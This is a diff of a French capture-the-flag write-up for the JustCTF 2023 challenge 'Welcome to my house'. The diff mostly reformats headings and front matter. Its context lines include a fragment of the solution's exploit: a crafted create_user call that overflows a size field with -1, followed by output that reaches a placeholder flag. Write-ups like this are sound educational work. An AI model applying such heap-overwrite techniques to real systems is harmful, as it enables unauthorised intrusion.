@@ -1,6 +1,8 @@
+---
+title: JustCTF 2023 - Welcome to my house
+---
 
-
-### Découverte du challenge
+# Découverte du challenge
 
 file
 ```bash
@@ -132,7 +134,7 @@ create_user(b"A"*0x18 + p64(-1, signed=True), b"root", dist)
 read_flag()
 ```
 
-#### Output
+## Output
 
 ```bash
 › python xpl.py
@@ -147,7 +149,7 @@ FLAG{f4k3_fl4g_f0r_t3st1ng}
 
 et voila !
 
-### Full exploit
+## Full exploit
 ```python
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
